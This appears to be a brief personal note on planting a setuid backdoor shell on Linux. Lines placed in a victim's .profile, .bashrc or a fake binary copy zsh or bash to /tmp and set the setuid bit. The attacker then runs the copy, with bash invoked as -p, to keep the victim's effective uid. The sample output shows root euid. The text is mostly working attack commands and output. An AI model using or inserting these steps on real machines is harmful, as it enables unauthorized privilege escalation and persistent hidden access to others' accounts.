# zsh

# doesn't drop privs by default (tested with zsh 5.0.2 (x86_64-redhat-linux-gnu) on my fedora 18)
attacker adds below lines to either ~victim/{.profile,.bashrc,./bin/firefox,...}
cp /bin/zsh /tmp/.stash/zsh
chmod +s /tmp/.stash/zsh
# then attacker runs /tmp/.stash/zsh to get the victim's euid

# zsh drops privs if run
zsh +p

# bash does not drop privs if run with -p
* run by victim
cp /bin/bash /tmp/lol
chmod +s /tmp/lol
* as attacker
/tmp/lol -p
lol-4.2# id
uid=1000(seb) gid=1000(seb) euid=0(root) egid=0(root) groups=0(root),7(lp),10(wheel),63(audio),100(users),991(wireshark),995(pulse-access),996(pulse),1000(seb),1002(logmon)
